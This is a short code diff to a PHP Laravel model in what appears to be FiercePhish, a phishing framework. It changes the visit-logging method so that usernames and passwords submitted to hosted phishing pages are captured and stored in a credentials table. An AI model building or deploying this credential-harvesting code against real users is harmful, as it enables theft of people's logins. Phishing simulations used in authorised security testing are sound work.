@@ -26,7 +26,7 @@ class HostedFile extends Model
     {
         $vars = $request->all();
         $path = storage_path('app/'.$this->local_path);
-        $continue = $this->logVisit($request);
+        $continue = $this->logVisit();
         if ($this->action == self::SERVE && $continue) {
             header('Content-Type: '.$this->file_mime);
             echo \File::get($path);
@@ -106,7 +106,7 @@ class HostedFile extends Model
         return $this->hasManyThrough('App\SiteCreds', 'App\HostedFileView');
     }
     
-    public function logVisit()
+    public function logVisit($username = null, $password = null)
     {
         $request = \Request::instance(); // Not type hinting in the arguments for later user scripting purposes
         if (\Auth::check()) { // Don't log the view if the user is logged in to FiercePhish
@@ -145,6 +145,11 @@ class HostedFile extends Model
             }
         }
         $visit->save();
+        if ($username !== null && $password !== null) {
+            $visit->credentials()->create(['username' => $username, 'password' => $password]);
+        } elseif ($request->has('username') && $request->has('password')) {
+            $visit->credentials()->create(['username' => $request->input('username'), 'password' => $request->input('password')]);
+        }
         
         return $continue;
     }
